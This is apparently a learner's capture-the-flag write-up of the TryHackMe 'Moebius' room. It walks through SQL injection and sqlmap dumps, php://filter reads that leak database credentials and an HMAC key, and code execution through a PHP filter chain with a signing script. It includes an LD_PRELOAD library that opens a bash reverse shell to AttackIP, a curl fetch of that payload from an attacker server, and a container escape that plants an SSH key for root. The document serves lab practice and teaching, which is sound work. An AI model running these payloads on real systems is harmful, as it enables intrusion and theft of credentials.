<h1 align="center">Moebius</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/bae9be08-198e-4fc7-9150-2e63d975b414"><br>
July 17, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, 
and I’m excited to join you on this adventure, part of my <code>437</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>A place where you start at some point, and you have to go back to it in the end</em>.<br>
Access it <a href="https://tryhackme.com/room/moebius"</a>here.<br><br>
I was able to complete this CTF following jaxafed walkthrough.  Thank you!<br><br>
<img width="1200px" src="https://github.com/user-attachments/assets/7d7d2845-babe-4e9b-99cd-6f4662cbb6ce"></p>

<br>

<h2>Task 1 . Get the user and root Flag</h2>
<p>Find the user flag and then... go back to where you began, in order to find the root flag.</p>

<h3 align="left"> Answer the questions below</h3>

> 1.1. <em>What is the value of the user flag?</em><br><a id='1.1'></a>
>> <strong><code>Redacted</code></strong><br>
<p></p>

<br>

> 1.2. <em>What is the value of the root flag?</em><br><a id='1.2'></a>
>> <strong><code>Redacted</code></strong><br>
<p></p>

<br>
<br>

<h3>nmap</h3>

```bash
:~/Moebius# nmap -sC -sV -Pn -p- -n -T4 TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Image Grid
```

<h3>gobuster</h3>

```bash
:~/Moebius# gobuster dir -u http://TargetIP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php,html,txt -t 80
...
/image.php            (Status: 200) [Size: 233]
/index.php            (Status: 200) [Size: 898]
/.html                (Status: 403) [Size: 276]
/album.php            (Status: 200) [Size: 841]
/server-status        (Status: 403) [Size: 276]
```

<h3>Web</h3>

<img width="1103" height="263" alt="image" src="https://github.com/user-attachments/assets/0285a5fc-99bd-46c1-ac63-86b90b0c94a7" />

<img width="1095" height="289" alt="image" src="https://github.com/user-attachments/assets/5b137f3a-ad9e-4812-a96b-243d5eee8dbf" />

<h3>Burp Suite and FoxyProxy</h3>
<p>
  
- launch Burp Suite<br>
- enable FoxyProxy
</p>

<br>

<h3>TargetIP> <code>Cute cats</code></h3>
<p>
  
- identify <code>/album.php?short_tag=cute</code><br>
- identifiy <code>hashes</code><br></p>

<img width="1168" height="555" alt="image" src="https://github.com/user-attachments/assets/ddfbb800-530a-4a9b-99fa-a919ab2f2930" />

<img width="1099" height="210" alt="image" src="https://github.com/user-attachments/assets/999e8c0f-6d22-419d-ac07-7f35d9eab477" />

<br>

<h3>TargetIP > <code>Smart cats</code></h3>
<p>
  
- identify <code>/album.php?short_tag=smart</code><br>
- identify <code>hashes</code><br></p>

<img width="1173" height="518" alt="image" src="https://github.com/user-attachments/assets/0e34b5e6-2ef3-4769-b62a-50ed6746a9a6" />

<img width="1103" height="410" alt="image" src="https://github.com/user-attachments/assets/ac03cc6e-1048-4e4c-98cd-1377c57f2412" />

<p>

- click over an image<br>
- identify its hash</p>

<p>http:/TargetIP.thm/image.php?hash=953d2306cb51044b11b7916d7a81cea0a49b22e457d5708b7f4f0561c4fc2695&path=/var/www/images/cat7.png</p>

<img width="147" height="144" alt="image" src="https://github.com/user-attachments/assets/8179ef59-4c6f-4410-92d8-5f43c4244c80" />

<img width="1170" height="276" alt="image" src="https://github.com/user-attachments/assets/c8456578-46d1-43fe-bbbb-6083806ec59a" />

<p>
  
- identify a QR code
- parse it</p>

<img width="1356" height="225" alt="image" src="https://github.com/user-attachments/assets/426e03af-9f0f-4fce-aa89-26b62629e08a" />

<p>https://www.youtube.com/watch?v=yRKh34Ofg50  8:-)</p>

<br>

<h3>TargetIP > <code>Favourite cats</code></h3>
<p>
  
- identify <code>/album.php?short_tag=fav</code><br>
- identifiy <code>hashes</code><br></p>

<br>

<h3>SQL Injection</h3>

```bash
http://TargetIP/album.php?short_tag=smart
```

```bash
http://TargetIP/album.php?short_tag=smart'
```

<p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server ...</p>

<img width="1059" height="51" alt="image" src="https://github.com/user-attachments/assets/2fb33e20-12d8-426f-a8e1-16ee03aa3ea4" />

```bash
http://TargetIP/album.php?short_tag=smart' AND 1=1;-- -
```

<img width="1050" height="45" alt="image" src="https://github.com/user-attachments/assets/590ab5e8-a908-4bc4-bafa-61dc8474b41f" />

```bash
http://TargetIP/album.php?short_tag=smart' AND 1=1 -- -
```

<p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server ...</p>

```bash
http://TargetIPm/album.php?short_tag=smart';
```

<p>Hacking attempt</p>

<br>

<h3>ffuf</h3>

```bash
:~/Moebius# ffuf -u 'http://TargetIP/album.php?short_tag=FUZZ' -w /usr/share/wordlists/SecLists/Fuzzing/special-chars.txt -mr 'Hacking attempt'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://TargetIP/album.php?short_tag=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Fuzzing/special-chars.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: Hacking attempt
________________________________________________

;                       [Status: 200, Size: 268, Words: 18, Lines: 11]
/                       [Status: 200, Size: 268, Words: 18, Lines: 11]
:: Progress: [32/32] :: Job [1/1] :: 18 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

<h3>sqlmap</h3>
<p>sqlmap</code> provided options to test the SQL injection<br><br>

- <code>boolean-based blind</code> -->   short_tag=smart' AND 6723=6723-- ylvK<br>
- <code>error-based</code> --> short_tag=smart' AND (SELECT 1440 FROM(SELECT COUNT(*),CONCAT(0x7178627171,(SELECT (ELT(1440=1440,1))),0x7178766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- HKpE<br>
- <code>time-based blind</code> --> short_tag=smart' AND (SELECT 3299 FROM (SELECT(SLEEP(5)))IFSW)-- PgAQ
- <code>UNION query</code> --> short_tag=-5166' UNION ALL SELECT CONCAT(0x7178627171,0x5061795057766459577454595a72774f444b7654474970706d584d7a727a5669616b5a516a4c736c,0x7178766a71)-- -
</p>

```bash
:~/Moebius# sqlmap -u 'http://TargetIP/album.php?short_tag=smart' -p short_tag --risk 3 --level 5 --batch --dbs --threads 10
...
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: short_tag (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: short_tag=smart' AND 6723=6723-- ylvK

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: short_tag=smart' AND (SELECT 1440 FROM(SELECT COUNT(*),CONCAT(0x7178627171,(SELECT (ELT(1440=1440,1))),0x7178766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- HKpE

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: short_tag=smart' AND (SELECT 3299 FROM (SELECT(SLEEP(5)))IFSW)-- PgAQ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: short_tag=-5166' UNION ALL SELECT CONCAT(0x7178627171,0x5061795057766459577454595a72774f444b7654474970706d584d7a727a5669616b5a516a4c736c,0x7178766a71)-- -
...
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
...
available databases [2]:                                                                                                                                                    
[*] information_schema
[*] web
```

<h3><code>web</code> database and table <code>albuns</code></h3>

```bash
:~/Moebius# sqlmap -u 'http://TargetIP/album.php?short_tag=smart' -p short_tag --risk 3 --level 5 --batch --threads 10 -D web --dump
...
Database: web
Table: images
[16 entries]
+----------------------------+
| path                       |
+----------------------------+
| /var/www/images/cat1.jpg   |
| /var/www/images/cat10.webp |
| /var/www/images/cat11.webp |
| /var/www/images/cat12.webp |
| /var/www/images/cat13.jpg  |
| /var/www/images/cat14.webp |
| /var/www/images/cat15.webp |
| /var/www/images/cat16.webp |
| /var/www/images/cat2.jpg   |
| /var/www/images/cat3.jpg   |
| /var/www/images/cat4.jpg   |
| /var/www/images/cat5.avif  |
| /var/www/images/cat6.avif  |
| /var/www/images/cat7.png   |
| /var/www/images/cat8.webp  |
| /var/www/images/cat9.webp  |
+----------------------------+
...
Database: web
Table: albums
[3 entries]
+----------------+-----------+--------------------------+
| name           | short_tag | description              |
+----------------+-----------+--------------------------+
| Cute cats      | cute      | Cutest cats in the world |
| Favourite cats | fav       | My favourite ones        |
| Smart cats     | smart     | So smart...              |
+----------------+-----------+--------------------------+
```

<h3>boolean-based blind testing</h3>

```bash
HTTP/1.1 200 OK
```

<h3>boolean-based blind testing</h3>

```bash
HTTP/1.1 200 OK
...
Connection failed: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxbqq1qxvjq1' for key 'group_key'
```

<h3>time-based blind testing</h3>

```bash
HTTP/1.1 200 OK
```

<h3>UNION query testing</h3>

```bash
UNION query --> short_tag=-5166' UNION ALL SELECT CONCAT(0x7178627171,0x5061795057766459577454595a72774f444b7654474970706d584d7a727a5669616b5a516a4c736c,0x7178766a71)-- -</p>
```

```bash
HTTP/1.1 200 OK
...
Connection failed: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'qxbqqPayPWvdYWtTYZrwODKvTGIppmXMzrzViakZQjLslqxvjq' in 'WHERE'
```

<br>

```bash
UNION query --> short_tag=smart=-5166'%20UNION%20SELECT%20%220%20UNION%20SELECT%201,2,0x2f6574632f706173737764--%20-%22--%20-- -
```

```bash
HTTP/1.1 200 OK
...
<!-- Short tag: smart=-5166' UNION SELECT "0 UNION SELECT 1,2,0x2f6574632f706173737764-- -"-- - - Album ID: 0 UNION SELECT 1,2,0x2f6574632f706173737764-- --->
<div class="grid-container">
<div class="image-container">
<a href="/image.php?hash=9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d&path=/etc/passwd"><img src="/image.php?hash=9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d&path=/etc/passwd" alt="Image path: /etc/passwd"></a>
```

<br>

```bash
http://TargetIP/album.php?short_tag=smart=-5166%27%20UNION%20SELECT%20%220%20UNION%20SELECT%201,2,0x2f6574632f706173737764--%20-%22--%20-
```
<img width="1034" height="119" alt="image" src="https://github.com/user-attachments/assets/2b79823f-be55-4dc6-bd7e-afd317771e86" />

```bash
http://TargetIP/image.php?hash=9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d&path=/etc/passwd
```

<img width="660" height="338" alt="image" src="https://github.com/user-attachments/assets/a35dfe5c-b5ff-4958-b856-f9e808c6a9bf" />

<img width="1061" height="343" alt="image" src="https://github.com/user-attachments/assets/ec767e4d-8535-461d-8341-1683d33be92f" />

<br>

<h3>album.php</h3>

```bash
php://filter/convert.base64-encode/resource=album.php
```

<img width="1345" height="260" alt="image" src="https://github.com/user-attachments/assets/9db1d8d6-0f38-4032-a0ca-b9161f1c9695" />

```bash
7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d616c62756d2e706870
```

```bash
http://TargetIP/album.php?short_tag=smart=-5166' UNION SELECT "0 UNION SELECT 1,2,0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d616c62756d2e706870-- -"-- -
```

<img width="1049" height="87" alt="image" src="https://github.com/user-attachments/assets/beba3459-40c1-458b-9f70-28df4c849bd6" />

<img width="1053" height="176" alt="image" src="https://github.com/user-attachments/assets/3058984f-b24a-45c7-ac4e-637c4c3dc960" />

<p>image.php</p>

<img width="656" height="56" alt="image" src="https://github.com/user-attachments/assets/6cd2ccaf-43fc-4156-b5bb-b3e0a07d79aa" />

<br>

<h3>curl</h3>

<p>

-  $hash = hash_hmac('sha256', $path, $SECRET_KEY);<br>
-  echo '<a href="/image.php?hash='. $hash . '&path=' . $path . '">';<br>
-  echo '<img src="/image.php?hash='. $hash . '&path=' . $path . '" alt="Image path: ' . $path . '">';</p>


```bash
:~/Moebius# curl -s 'http://TargetIP/image.php?hash=ec6e518b7e39db98affbf2bf2c671d469639503d4fee97bf7cf0f0a1319075d9&path=php://filter/convert.base64-encode/resource=album.php' | base64 -d
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Image Grid</title>
<link rel="stylesheet" href="/style.css"> <!-- Link to external CSS file -->
</head>
<body>

<?php

include('dbconfig.php');

try {
    // Create a new PDO instance
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    
    // Set PDO error mode to exception
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    if (preg_match('/[\/;]/', $_GET['short_tag'])) {
        // If it does, terminate with an error message
        die("Hacking attempt");
    }

    $album_id = "SELECT id from albums where short_tag = '" . $_GET['short_tag'] . "'";
    $result_album = $conn->prepare($album_id);
    $result_album->execute();
     
    $r=$result_album->fetch();
    $id=$r['id'];
    
     
    // Fetch image IDs from the database
    $sql_ids = "SELECT * FROM images where album_id=" . $id;
    $stmt_path= $conn->prepare($sql_ids);
    $stmt_path->execute();
    
    // Display the album id
    echo "<!-- Short tag: " . $_GET['short_tag'] . " - Album ID: " . $id . "-->\n";
    // Display images in a grid
    echo '<div class="grid-container">' . "\n";
    foreach ($stmt_path as $row) {
        // Get the image ID
        $path = $row["path"];
        $hash = hash_hmac('sha256', $path, $SECRET_KEY);

        // Create link to image.php with image ID
        echo '<div class="image-container">' . "\n";
        echo '<a href="/image.php?hash='. $hash . '&path=' . $path . '">';
        echo '<img src="/image.php?hash='. $hash . '&path=' . $path . '" alt="Image path: ' . $path . '">';
        echo "</a>\n";
        echo "</div>\n";;
    }
    echo "</div>\n";
} catch(PDOException $e) {
    echo "Connection failed: " . $e->getMessage();
}

// Close the connection
$conn = null;

?>
</body>
</html>
```

<br>

<h3>dbconfig.php</h3>

```bash
php://filter/convert.base64-encode/resource=dbconfig.php
```

<img width="1347" height="234" alt="image" src="https://github.com/user-attachments/assets/0be0c83a-6656-4eb1-b9fd-442c67486133" />


```bash
7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d6462636f6e6669672e706870
```

```bash
http://TargetIP/album.php?short_tag=smart=-5166' UNION SELECT "0 UNION SELECT 1,2,0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d6462636f6e6669672e706870-- -"-- -
```

<img width="1027" height="116" alt="image" src="https://github.com/user-attachments/assets/25afe37b-5ed1-4a48-88a7-8530f5eadd3a" />

```bash
http://TargetIP/image.php?hash=ec6e518b7e39db98affbf2bf2c671d469639503d4fee97bf7cf0f0a1319075d9&path=php://filter/convert.base64-encode/resource=album.php
```

<img width="1005" height="204" alt="image" src="https://github.com/user-attachments/assets/d4779925-2c6f-4ef0-94a5-ac61e0731dec" />

```bash
http://TargetIP/album.php?short_tag=smart=-5166%27%20UNION%20SELECT%20%220%20UNION%20SELECT%201,2,0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d6462636f6e6669672e706870--%20-%22--%20-
```

<h3>Secret Key</h3>

```bash
:~/Moebius# curl -s 'http:/TargetIP/image.php?hash=329e7517a6e3c82421ee8ce483271c69a71fbcc7e6956abde4957a63f4ad9ccf&path=php://filter/convert.base64-encode/resource=dbconfig.php' | base64 -d
<?php
// Database connection settings
$servername = "db";
$username = "web";
$password = "TAJnF6YuIot83X3g";
$dbname = "web";


$SECRET_KEY='an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW';
?>
```

<h3>CyberChef</h3>

<img width="1349" height="208" alt="image" src="https://github.com/user-attachments/assets/16af1b89-ef6c-4d7a-8a70-fe1daee876c7" />

```bash
php://filter/convert.base64-encode/resource=dbconfig.php
```

```bash
7d96b9a087f798453ff2a28959f80433464afbf3846ed22f252f15b4ee48f0cc
```

<br>
<br>

<h3>PHP Filter Chain Generator</h3>
<p>https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/refs/heads/main/php_filter_chain_generator.py</p>

```bash
:~/Moebius# python3 ./php_filter_chain_generator.py --chain '<?=eval($_GET[0])?>'
[+] The following gadget chain will generate the following code : <?=eval($_GET[0])?> (base64 value: PD89ZXZhbCgkX0dFVFswXSk/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|co.............de|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

```bash
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|co.............de|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

<h3>shell.c</h3>

```bash
:~/Moebius# cat shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
  unsetenv("LD_PRELOAD");
  system("bash -c \"bash -i >& /dev/tcp/AttackIP/AttackPort0>&1\"");
}
```

```bash
:~/Moebius# gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

<h3>PHP script to execute arbitrary code on the Target</h3>

```bash
import hmac
import hashlib
import requests

target_url = "http://TargetIP/image.php" # change the IP address

secret_key = b"an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW"
path = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|co.............de|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp".encode()  # replace with the output of php_filter_chain_generator.py
h = hmac.new(secret_key, path, hashlib.sha256)
signature = h.hexdigest()

while True:
    params = {
        "hash": signature,
        "path": path,
        "0": input("code> ")
    }
    resp = requests.get(target_url, params=params, timeout=5)
    text = resp.text
    print(text)
```


```bash
:~/Moebius# python3 execute_code.py
code> system("id);
<br />
<b>Parse error</b>:  Unclosed '(' in <b>php://filter/convert.iconv.UTF8.CSISO2022KR...
...
code> echo init_get('disable_functions');
<br />
<b>Fatal error</b>:  Uncaught Error: Call to undefined function init_get() in php://filter/convert.iconv.UTF8.CSISO2022KR...
...
code> $var = curl_init('http://AttackIP:8000/shell.so');curl_setopt($var, CURLOPT_RETURNTRANSFER, true);file_put_contents('/tmp/shell.so', curl_exec($var)); curl_close($var);
```

```bash
:~/Moebius# ls
execute_code.py  php_filter_chain_generator.py  shell.c  shell.so
```

```bash
:~/Moebius# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
TargetIP- - [17/Jul/2025 xx:xx:xx] "GET /shell.so HTTP/1.1" 200 -
```

```bash
code> putenv('LD_PRELOAD=/tmp/shell.so'); mail('a','a','a','a');
```

<h3>Shell</h3>
<h4>Stabilize</h4>

```bash
:~/Moebius# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on TargetIP 37242
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bb28d5969dd5:/var/www/html$ which python3
which python3
www-data@bb28d5969dd5:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<tml$ python3 -c 'import pty;pty.spawn("/bin/bash")'
bash: python3: command not found
www-data@bb28d5969dd5:/var/www/html$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
www-data@bb28d5969dd5:/var/www/html$ ^Z
[1]+  Stopped                 nc -nlvp 4444
root@ip-10-10-85-251:~/Moebius# stty raw -echo; fg
nc -nlvp 4444

www-data@bb28d5969dd5:/var/www/html$ export TERM=xterm
www-data@bb28d5969dd5:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),27(sudo)
```

```bash
www-data@bb28d5969dd5:/var/www/html$ sudo -l
Matching Defaults entries for www-data on bb28d5969dd5:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on bb28d5969dd5:
    (ALL : ALL) ALL
    (ALL : ALL) NOPASSWD: ALL
```

<h3>Root</h3>

```bash
www-data@bb28d5969dd5:/var/www/html$ sudo su
root@bb28d5969dd5:~# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@bb28d5969dd5:~# ls -lah
total 16K
drwx------ 2 root root 4.0K Feb 24 00:00 .
drwxr-xr-x 1 root root 4.0K Mar  8 06:39 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
root@bb28d5969dd5:~# grep CapEff /proc/self/status
CapEff:	000001ffffffffff
```

```bash
:~/Moebius# capsh --decode=000001ffffffffff
WARNING: libcap needs an update (cap=40 should have a name).
0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,38,39,40
```

```bash
root@bb28d5969dd5:/var/www/html# cd /dev
root@bb28d5969dd5:/dev# ls
autofs		 mqueue     stdin   tty3   tty53   ttyS19     vcs1
btrfs-control	 net	    stdout  tty30  tty54   ttyS2      vcs2
core		 ng0n1	    tty     tty31  tty55   ttyS20     vcs3
cpu_dma_latency  ng1n1	    tty0    tty32  tty56   ttyS21     vcs4
cuse		 ng2n1	    tty1    tty33  tty57   ttyS22     vcs5
dma_heap	 null	    tty10   tty34  tty58   ttyS23     vcs6
ecryptfs	 nvme0	    tty11   tty35  tty59   ttyS24     vcsa
fd		 nvme0n1    tty12   tty36  tty6    ttyS25     vcsa1
full		 nvme0n1p1  tty13   tty37  tty60   ttyS26     vcsa2
fuse		 nvme1	    tty14   tty38  tty61   ttyS27     vcsa3
hpet		 nvme1n1    tty15   tty39  tty62   ttyS28     vcsa4
hwrng		 nvme2	    tty16   tty4   tty63   ttyS29     vcsa5
input		 nvme2n1    tty17   tty40  tty7    ttyS3      vcsa6
kmsg		 nvram	    tty18   tty41  tty8    ttyS30     vcsu
loop-control	 port	    tty19   tty42  tty9    ttyS31     vcsu1
loop0		 ppp	    tty2    tty43  ttyS0   ttyS4      vcsu2
loop1		 psaux	    tty20   tty44  ttyS1   ttyS5      vcsu3
loop2		 ptmx	    tty21   tty45  ttyS10  ttyS6      vcsu4
loop3		 pts	    tty22   tty46  ttyS11  ttyS7      vcsu5
loop4		 random     tty23   tty47  ttyS12  ttyS8      vcsu6
loop5		 rfkill     tty24   tty48  ttyS13  ttyS9      vfio
loop6		 rtc0	    tty25   tty49  ttyS14  ttyprintk  vga_arbiter
loop7		 shm	    tty26   tty5   ttyS15  udmabuf    vhost-net
mapper		 snapshot   tty27   tty50  ttyS16  uinput     vhost-vsock
mcelog		 snd	    tty28   tty51  ttyS17  urandom    zero
mem		 stderr     tty29   tty52  ttyS18  vcs	      zfs
```

```bash
root@bb28d5969dd5:~# mount /dev/nvme0n1p1 /mnt
root@bb28d5969dd5:~# cat /mnt/etc/hostname
ubuntu-jammy
```

<h3>Generate SSH Key</h3>

```bash
:~/Moebius# ssh-keygen -f id_rsa -t rsa
...
:~/Moebius# cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKssFFfeF.....
```



```bash
root@bb28d5969dd5:~# echo 'ssh-ed25519 AAAAB3NzaC1yc2EAAAADAQABAAABgQDKssFFfeF.....' >> /mnt/root/.ssh/authorized_keys
```

<h3>ssh</h3>

```bash
:~/Moebius# ssh -i id_rsa root@TargetIP
root@ubuntu-jammy:~# ls
challenge  snap  user.txt
root@ubuntu-jammy:~# cat user.txt
THM{Redacted}
```

<br>


```bash
root@ubuntu-jammy:~# cd challengeroot@ubuntu-jammy:~/challenge# ls -lah
total 20K
drwxr-xr-x 4 root root 4.0K Mar  8 06:39 .
drwx------ 6 root root 4.0K Mar  8 06:39 ..
drwxr-xr-x 2 root root 4.0K Mar  8 06:40 db
-rw-r--r-- 1 root root  294 Mar  8 06:39 docker-compose.yml
drwxr-xr-x 3 root root 4.0K Mar  8 06:39 web
```

<h3>deb.env</h3>

```bash
root@ubuntu-jammy:~/challenge# cd db
root@ubuntu-jammy:~/challenge/db# ls
db.env
root@ubuntu-jammy:~/challenge/db# cat db.env
MYSQL_PASSWORD=TAJnF6YuIot83X3g
MYSQL_DATABASE=web
MYSQL_USER=web
MYSQL_ROOT_PASSWORD=gG4i8NFNkcHBwUpd
```

<h3>Containers available</h3>

```bash
root@ubuntu-jammy:~/challenge/db# docker container ls
CONTAINER ID   IMAGE                    COMMAND                  CREATED        STATUS       PORTS                                 NAMES
89366d62e05c   mariadb:10.11.11-jammy   "docker-entrypoint.s\u2026"   4 months ago   Up 4 hours   3306/tcp                              challenge-db-1
bb28d5969dd5   challenge-web            "docker-php-entrypoi\u2026"   4 months ago   Up 4 hours   0.0.0.0:80->80/tcp, [::]:80->80/tcp   challenge-web-1
```

<h3>Shell in tha database Container</h3>

```bash
root@ubuntu-jammy:~/challenge/db# docker container exec -it 89366d62e05c bash
root@89366d62e05c:/#
```


<h3>Access the Database using the password discovered in <code>db.env</code></h3>

```bash
root@89366d62e05c:/# mysql -u root -p gG4i8NFNkcHBwUpd
Enter password: 
ERROR 1049 (42000): Unknown database 'gG4i8NFNkcHBwUpd'
```


```bash
root@89366d62e05c:/# mysql -u root -pgG4i8NFNkcHBwUpd
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 237
Server version: 10.11.11-MariaDB-ubu2204 mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

<h3>Query the <code>secret>/code> database </code></h3>


```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| secret             |
| sys                |
| web                |
+--------------------+
6 rows in set (0.002 sec)

MariaDB [(none)]> use secret;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [secret]> show tables;
+------------------+
| Tables_in_secret |
+------------------+
| secrets          |
+------------------+
1 row in set (0.000 sec)

MariaDB [secret]> select * from secrets;
+---------------------------------------+
| flag                                  |
+---------------------------------------+
| THM{REDACTED} |
+---------------------------------------+
1 row in set (0.000 sec)

MariaDB [secret]>
```


<br>
<br>

<img width="1900" height="888" alt="image" src="https://github.com/user-attachments/assets/8ab4a0ed-1a5e-47c5-a8fe-3e919607832f" />

<img width="1890" height="894" alt="image" src="https://github.com/user-attachments/assets/53b65f05-0dbe-408a-bb58-45801f7a0391" />

<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 17, 2025     | 437      |     155ᵗʰ    |      5ᵗʰ     |    171ᵗʰ    |     7ᵗʰ    | 115,269  |    864    |    72     |

</div>

<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/93ce77d6-0e99-4881-b359-b70c005bb0c6" />

<img width="1890" height="893" alt="image" src="https://github.com/user-attachments/assets/b7587492-6c34-4071-b5c2-84c782a419d8" />

<img width="1891" height="894" alt="image" src="https://github.com/user-attachments/assets/6634088d-711d-49d5-9675-73b24eb6ecc9" />

<img width="1891" height="898" alt="image" src="https://github.com/user-attachments/assets/2c65cb8c-c46b-4fbb-8bd3-6c46c4ad18fa" />

<img width="1889" height="888" alt="image" src="https://github.com/user-attachments/assets/b4edc915-b325-45ae-b1c4-1dc2445effd2" />
